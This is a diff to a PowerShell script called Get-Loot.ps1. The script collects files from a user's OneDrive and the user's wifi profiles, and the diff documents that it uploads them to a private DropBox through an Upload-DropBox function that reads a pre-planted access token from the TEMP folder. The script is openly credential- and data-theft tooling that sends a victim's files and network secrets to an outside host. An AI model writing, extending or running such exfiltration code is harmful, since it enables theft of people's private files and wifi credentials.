@@ -5,6 +5,7 @@
     
 .DESCRIPTION
     The script currently collects files from a user's OneDrive (if OneDrive is used) and collects the user's wifi profiles.
+    The script uploads the collected files to a private DropBox via the DropBox API.
 
 .NOTES
     Filename: Get-Loot.ps1
@@ -24,7 +25,8 @@ function Upload-DropBox() {
     param(
         [Parameter(ValueFromPipeline=$True)]
         [string]$SourceFilePath
-    ) 
+    )
+    # Grabbing the DropBox access token locally. The access token is delivered prior to running this script
     $accessToken = Get-Content -Path $env:TEMP\at.txt
     $outputFile = Split-Path $SourceFilePath -leaf
     $targetFilePath = "/$outputFile"
